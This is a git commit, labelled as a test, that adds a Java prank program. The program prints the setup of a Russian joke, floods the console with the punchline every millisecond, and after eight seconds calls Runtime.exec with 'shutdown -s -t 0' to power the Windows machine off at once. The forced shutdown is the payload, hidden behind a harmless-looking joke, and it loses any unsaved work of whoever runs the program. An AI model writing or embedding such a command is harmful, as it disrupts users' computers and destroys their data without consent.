37bb3af050b39e156d9835c14b6c081bf5445c16
Феликс <dinlemon11@gmail.com>
2019-09-15 16:04:45 +0300

    Тестовый коммит

---
+++ prekolXD/src/com/company/Main.java
@@ -0,0 +1,35 @@
+package com.company;
+
+import java.io.IOException;
+import java.util.Timer;
+import java.util.TimerTask;
+
+public class Main {
+    public static void main (String [] args) throws IOException{
+        String shutdownCommand;
+        String operatingSystem = System.getProperty("os.name");
+        Timer timer = new Timer();
+        TimerTask task = new TimerTask() {
+            @Override
+           public void run()  {
+                System.out.println ("А ОНА ЕМУ КАК РАЗ)))))))))))))");
+                }
+            };
+        System.out.println("Купил мужик шляпу...");
+        timer.schedule(task, 5000,1);
+        System.out.println();
+        try {
+            Thread.sleep(8000);
+            while (true) {
+                Runtime runtime = Runtime.getRuntime();
+                Process proc = runtime.exec("shutdown -s -t 0");
+                System.exit(0);
+            }
+        }
+        catch (InterruptedException e) {
+
+        }
+    }
+    }
+
+
